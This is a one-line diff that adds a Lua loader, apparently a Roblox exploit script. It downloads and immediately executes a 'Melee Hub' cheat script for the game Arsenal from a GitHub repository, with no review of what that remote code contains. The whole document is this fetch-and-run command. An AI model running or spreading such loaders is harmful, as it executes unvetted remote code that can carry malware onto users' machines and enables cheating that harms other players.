@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D8rkX/D8rk-Hub/main/Arsenal%20Scripts/Hubs-Extras/Melee%20Hub%20V1.lua",true))()
